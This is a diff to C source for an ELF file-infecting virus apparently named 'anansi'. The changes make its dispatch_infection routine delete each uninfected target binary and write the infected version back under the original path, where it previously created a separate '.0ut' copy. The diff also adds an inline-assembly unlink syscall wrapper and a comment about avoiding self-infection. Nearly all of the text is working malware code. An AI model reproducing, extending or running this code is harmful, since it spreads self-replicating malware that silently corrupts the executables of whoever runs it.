@@ -37,7 +37,6 @@
 //misc macros
 #define RDRAND_BIT (1 << 30)
 #define EPILOG_SIZE 30
-//#define BANNERLEN 1327
 #define XOR_KEY 0x890c6d01
 
 typedef struct elfbin {
@@ -114,6 +113,7 @@ long anansi_stat(const char *path, struct stat *statbuf);
 long anansi_munmap(void *addr, size_t len);
 long anansi_readlink(const char *path, char *buf, size_t bufsiz);
 long anansi_open(const char *pathname, int flags, int mode);
+long anansi_unlink(const char *pathname);
 long anansi_getdents64(int fd, void *dirp, size_t count);
 long anansi_getcwd(char *buf, size_t size);
 long anansi_close(int fd);
@@ -198,8 +198,8 @@ void vx_main()
 	anansi_write(STDOUT_FILENO, anansi_msg, anansi_strlen(anansi_msg));
 
 #ifdef DEBUG
-	anansi_printf("vx_start @ 0x0%lx\n", vx_start);
-	anansi_printf("vx_size (pre-epilogue) @ 0x%lx\n", vx_size);
+	anansi_printf("vx_start @ %lx\n", vx_start);
+	anansi_printf("vx_size (pre-epilogue) @ %lx\n", vx_size);
 	anansi_printf("max_target @ %d\n", max_target);
 #endif
 
@@ -234,7 +234,7 @@ void vx_main()
 			continue;
 
 		if(self_path)
-			if(!anansi_strncmp(self_path, full_path, anansi_strlen(self_path)))
+			if(!anansi_strncmp(self_path, full_path, anansi_strlen(self_path))) //prevent self-infection
 				continue;
 
 		process_elf_initialize(&target, full_path);
@@ -266,7 +266,6 @@ clean_up:
 		anansi_munmap(self_path, anansi_strlen(self_path));
 }
 
-
 char *get_self_path()
 {
 	size_t path_len;
@@ -291,7 +290,7 @@ int dispatch_infection(Elfbin *target)
 	uint8_t *insertion;
 	uint64_t orig_entry;
 
-	char filename_append[] = ".0ut";
+	//char filename_append[] = ".0ut";
 
 	bool use_reloc_poison;
 
@@ -322,19 +321,26 @@ int dispatch_infection(Elfbin *target)
 
 	append_ret_2_OEP_stub(insertion, target, orig_entry);
 	size_t f_path_len = anansi_strlen(target->f_path);
-	char *v_name = anansi_malloc(f_path_len + 5);
+	//char *v_name = anansi_malloc(f_path_len + 5);
 	int fd_out;
 
-	anansi_strncpy(v_name, target->f_path, f_path_len);
-	anansi_strncpy(v_name + f_path_len, filename_append, 4);
+	//anansi_strncpy(v_name, target->f_path, f_path_len);
+	//anansi_strncpy(v_name + f_path_len, filename_append, 4);
 
+#ifdef DEBUG
+	anansi_printf("\t\t\tDeleting uninfected %s\n", target->f_path);
+#endif
+	anansi_unlink(target->f_path);
+
+/*
 #ifdef DEBUG
 	anansi_printf("\t\t\tCreating viral file %s\n", v_name);
 #endif
-	fd_out = anansi_open(v_name, O_CREAT | O_WRONLY, S_IRWXU | S_IRGRP | S_IROTH);
+*/
+	fd_out = anansi_open(target->f_path, O_CREAT | O_WRONLY, S_IRWXU | S_IRGRP | S_IROTH);
 	if(fd_out < 0) {
 #ifdef DEBUG
-		anansi_printf("\t\t\tfailure to open v_name\n");
+		anansi_printf("\t\t\tfailure to open handler to would be infected file\n");
 #endif
 		return -1;
 	}
@@ -345,7 +351,7 @@ int dispatch_infection(Elfbin *target)
 	anansi_write(fd_out, target->write_only_mem, target->new_size);
 
 	anansi_close(fd_out);
-	anansi_munmap(v_name, f_path_len + 5);
+	//anansi_munmap(v_name, f_path_len + 5);
 	return 0;
 }
 
@@ -1312,6 +1318,21 @@ int anansi_strncmp(const char *s1, const char *s2, size_t n)
                 return ret; \
         }
 
+#define __unlink_syscall(type, name, arg1, arg1_type) \
+		type name(arg1_type arg1) { \
+        	type ret; \
+			__asm__ __volatile__( \
+            				"movq $87, %%rax\n" \
+            				"movq %0, %%rdi\n" \
+							"syscall" \
+							: \
+							: "g" (arg1) \
+							: "%rax", "%rdi" \
+			); \
+ 			__load_syscall_ret(ret); \
+			return ret; \
+		}
+
 #define __getdents64_syscall(type, name, arg1, arg1_type, arg2, arg2_type, arg3, arg3_type) \
         type name(arg1_type arg1, arg2_type arg2, arg3_type arg3) { \
                 type ret; \
@@ -1368,6 +1389,7 @@ __readlink_syscall(long, anansi_readlink, pathname, const char *restrict, buf, c
 __stat_syscall(long, anansi_stat, path, const char *, statbuf, struct stat *);
 __munmap_syscall(long, anansi_munmap, addr, void *, len, size_t);
 __open_syscall(long, anansi_open, pathname, const char *, flags, int, mode, int);
+__unlink_syscall(long, anansi_unlink, pathname, const char *);
 __getdents64_syscall(long, anansi_getdents64, fd, int, dirp, void *, count, size_t);
 __getcwd_syscall(long, anansi_getcwd, buf, char *, size, size_t);
 __close_syscall(long, anansi_close, fd, int);
